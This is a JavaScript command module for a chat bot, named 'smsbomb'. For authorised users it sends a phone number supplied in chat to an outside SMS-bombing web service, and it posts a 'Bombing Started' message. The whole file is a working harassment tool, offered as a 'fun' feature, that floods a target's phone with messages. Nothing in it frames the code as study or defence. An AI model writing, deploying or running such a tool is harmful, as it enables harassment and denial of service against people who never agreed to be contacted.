const axios = require("axios");

module.exports.config = {
    name: "smsbomb",
    version: "1.0",
    role: 0,
    author: "Kingi Charles",
    description: "𝗦𝗠𝗦 𝗕𝗼𝗺𝗯𝗲𝗿",
    category: "𝗙𝗨𝗡",
    guide: "{pn} [number]",
    countDown: 5
};

module.exports.onStart = async ({ api, event, args, message }) => {
  const permission = global.GoatBot.config.vipUser;
  if (!permission.includes(event.senderID)) {
    api.sendMessage(args.join(' '), event.threadID, event.messageID);
    return;
  }
  try{
    if (!args[0]) {
        return api.sendMessage("🧸 | 𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐭𝐞𝐫 𝐚 𝐩𝐡𝐨𝐧𝐞 𝐧𝐮𝐦𝐛𝐞𝐫 𝐭𝐡𝐚𝐭 𝐬𝐭𝐚𝐫𝐭 𝐰𝐢𝐭𝐡 𝟎𝟏×××××××××", event.threadID, event.messageID);
    }

    // Display "SMS Bombing Started.." message
   await api.sendMessage("⏳ | 𝚂𝙼𝚂 𝙱𝚘𝚖𝚋𝚒𝚗𝚐 𝚂𝚝𝚊𝚛𝚝𝚎𝚍..", event.threadID, event.messageID);
    // Making request to the JSON API (assuming you are using Axios)
    await axios.get(`https://bombapi.000webhostapp.com/oggy/api/all.php?phone=${args[0]}`);
    // Check if request was successful 
  }catch(err){
    console.log(err);
    message.reply("❎ | " + err)
  }
   
}